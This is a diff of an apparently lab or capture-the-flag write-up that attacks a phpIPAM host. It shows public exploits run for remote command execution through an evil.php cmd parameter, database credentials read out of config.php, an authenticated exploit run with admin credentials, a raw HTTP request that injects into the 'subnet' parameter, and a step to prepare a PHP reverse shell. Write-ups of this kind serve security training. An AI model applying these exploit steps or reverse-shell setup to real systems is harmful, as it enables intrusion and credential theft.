@@ -80,13 +80,16 @@ search vulnerabilities
 
 searchsploit gives CVE php/webapps/50963.py
 
+Running it and we have RCE
 http://10.10.117.132/evil.php?cmd=cat%20config.php
 
+```
 $db['host'] = 'localhost';
 $db['user'] = 'phpipam_ollie';
 $db['pass'] = 'IamDah1337estHackerDog!';
 $db['name'] = 'phpipam';
 $db['port'] = 3306;
+```
 
 but dead end for the rest.
 
@@ -98,7 +101,7 @@ proxy on localhost 8081 redirect to ${IP}
 python3 50684.py -u http://localhost:8081 -U admin -P OllieUnixMontgomery!
 
 Then change the subnet variable to:
-
+```
 POST /app/admin/routing/edit-bgp-mapping-search.php HTTP/1.1
 Host: 10.10.117.132:80
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
@@ -110,6 +113,7 @@ Cookie: phpipam=rnu8br5ibkc9vceq543pch2p5b
 Content-Length: 22
 
 subnet=inject&bgp_id=1
+```
 
 copy kali's php revshell to local and change port and IP
 
